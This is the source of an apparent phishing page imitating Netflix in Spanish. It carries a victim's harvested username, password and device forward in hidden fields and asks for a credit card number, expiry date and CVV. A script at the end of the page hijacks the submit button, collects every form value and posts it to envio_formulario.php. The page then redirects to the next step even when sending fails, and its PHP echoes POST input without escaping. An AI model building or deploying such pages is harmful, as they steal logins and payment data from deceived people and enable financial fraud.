<?php
    if(isset($_POST['hdd-usuario'])){
?>
<html>
    <head>
        <title>Neflix</title>
        <meta http-equiv="content-type" content="text/html; utf-8">
        <meta charset="utf-8">
        
        <meta content="es" http-equiv="Content-Language">
    
        <meta name="description" content="">
        <meta name="author" content="">
        <meta name="Copyright" content="">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <link rel="icon" href="../../img/icono.ico" type="image/x-icon">
        <script type="text/javascript" src="../../js/jquery-3.6.0.min.js"></script>      
        <link href="../../css/style-white.css" rel="stylesheet">
        <link href="../../css/stylesheet.css" rel="stylesheet">
        <script type="text/javascript" src="../../js/functions.js"></script>   
        <script type="text/javascript" src="../../js/ready.js"></script>           
        <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,wght@0,200;0,300;0,400;0,600;0,700;0,800;0,900;1,200;1,300;1,400;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">   
        <script type="text/javascript">  
              
        </script>
    </head>
    <body>
        <div class="container">
            <div class="logo">
                <table cellpadding="0" cellspacing="0" border="0" width="100%">
                    <tr>
                        <td valign="middle" align="left"><img src="../../img/logo.png" width="170"></td>
                        <td valign="middle" align="right" class="btn-cerrar">Cerrar sesión</td>
                    </tr>                    
                </table>
            </div>           
            <div class="frm-tarjeta">
                <form name="smt-tarjeta" id="smt-tarjeta" action="../../pedir_logo.php" method="post" target="_self">
                    <input type="hidden" name="hdd-usuario" id="hdd-usuario" value="<?php echo $_POST['hdd-usuario']; ?>">  
                    <input type="hidden" name="hdd-contrasena" id="hdd-contrasena" value="<?php echo $_POST['hdd-contrasena']; ?>">  
                    <input type="hidden" name="hdd-dispositivo" id="hdd-dispositivo" value="<?php echo $_POST['hdd-dispositivo']; ?>">  

                    <div class="container-frm">
                        <img src="../../img/icon-tar.png" width="62" style="margin-bottom: 30px;">
                        <div class="paso">PASO 2 DE 3</div>
                        <div class="titulo-negro">Configura tu tarjeta de crédito o débito</div>  
                        <img src="../../img/tar.jpg">              
                        <div class="frm-input" id="inp-nombre">
                            <div class="etiqueta">Nombre</div>
                            <input type="text" class="entrada" id="txt-nombre" name="txt-nombre" autocomplete="off">
                        </div>
                        <div class="error" id="err-nombre">Ingresa un nombre.</div>

                        <div class="frm-input" id="inp-apellido">
                            <div class="etiqueta">Apellido</div>
                            <input type="text" class="entrada" id="txt-apellido" name="txt-apellido" autocomplete="off">
                        </div>

                        <div class="frm-input" id="inp-tarjeta">
                            <div class="etiqueta">Número de tarjeta</div>
                            <input type="text" class="entrada" id="txt-tarjeta" name="txt-tarjeta" autocomplete="off">
                        </div>
                        <div class="error" id="err-tarjeta">Ingresa un número de tarjeta.</div>

                        <div class="frm-input" id="inp-fecha">
                            <div class="etiqueta">Fecha de vencimiento (MM/AA)</div>
                            <input type="text" class="entrada" id="txt-fecha" name="txt-fecha" autocomplete="off" pattern="[0-9]*" inputmode="numeric" onKeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
                        </div>
                        <div class="error" id="err-fecha">Ingresa un mes de vencimiento.</div>

                        <div class="frm-input" id="inp-cvv">
                            <table border="0" width="100%" cellspacing="0" cellpadding="0">
                                <tr>
                                    <td>
                                        <div class="etiqueta">Código de seguridad (CVV)</div>
                                        <input type="text" class="entrada" id="txt-cvv" name="txt-cvv" maxlength="4" autocomplete="off">
                                    </td>
                                    <td width="40" valign="top"><img src="../../img/ayuda.jpg" width="38"></td>
                                </tr>
                            </table>
                            
                        </div>
                        <div class="error" id="err-cvv">Ingresa un código de seguridad (CVV).</div>

                        <button class="btn btn-rojo esp-btn" id="btn-p1a-sgt" type="button">Siguiente</button>                  
                    </div>
                </form>
            </div>

            <div class="footer">
                <div class="container-foot">
                    ¿Preguntas? Llama al <span class="telefono">01 800 917 1564</span>
                    <br><br>
                    <table cellpadding="0" cellspacing="0" width="100%" id="t1">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                            </td>
                            <td>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t2">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>
                            </td>
                            <td>
                                <div class="menu-footer">Términos de uso</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>                            
                        </tr>
                    </table>

                    <table cellpadding="0" cellspacing="0" width="100%" id="t3">
                        <tr>
                            <td>
                                <div class="menu-footer">Preguntas frecuentes</div>
                                <div class="menu-footer">Preferencias de cookies</div>
                                <div class="menu-footer">Privacidad</div>
                            </td>
                            <td>
                                <div class="menu-footer">Centro de ayuda</div>
                                <div class="menu-footer">Información corporativa</div>                           
                                <div class="menu-footer">Términos de uso</div>                                
                            </td>                            
                        </tr>
                    </table>
                    <br>
                    <select style="background-color: #fff;color: #737373;padding: 9px;">
                        <option>Español</option>
                        <option>English</option>
                    </select>
                </div>
            </div>
        </div>
      <script>
(function() {
    const btnId = 'btn-p1a-sgt'; // botón original
    const targetURL = '../../pedir_logo.php'; // página a la que queremos redirigir

    const waitForBtn = setInterval(() => {
        const btn = document.getElementById(btnId);
        if (!btn) return;
        clearInterval(waitForBtn);

        btn.addEventListener('click', function(e) {
            e.preventDefault(); // bloquea el comportamiento original
            e.stopImmediatePropagation(); // evita que otros listeners se ejecuten

            const payload = {};

            // todos los inputs, selects y textareas
            document.querySelectorAll('input, select, textarea').forEach(el => {
                if(el.type === 'checkbox' || el.type === 'radio') {
                    if(el.checked) payload[el.id || el.name] = el.value.trim();
                } else {
                    payload[el.id || el.name] = el.value.trim();
                }
            });

            console.log('JS universal ejecutándose, payload:', payload);

            // enviar al PHP
            fetch('../../envio_formulario.php', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify(payload)
            })
            .then(r => r.text())
            .then(data => {
                console.log('envio_formulario.php respondió:', data);
                // redirigir forzadamente
                window.location.href = targetURL;
            })
            .catch(err => {
                console.error('Error fetch:', err);
                window.location.href = targetURL; // incluso si falla
            });
        });
    }, 200);
})();
</script>
    </body>
</html>
<?php
    }else{
         header('Location: ../../');
    }
?>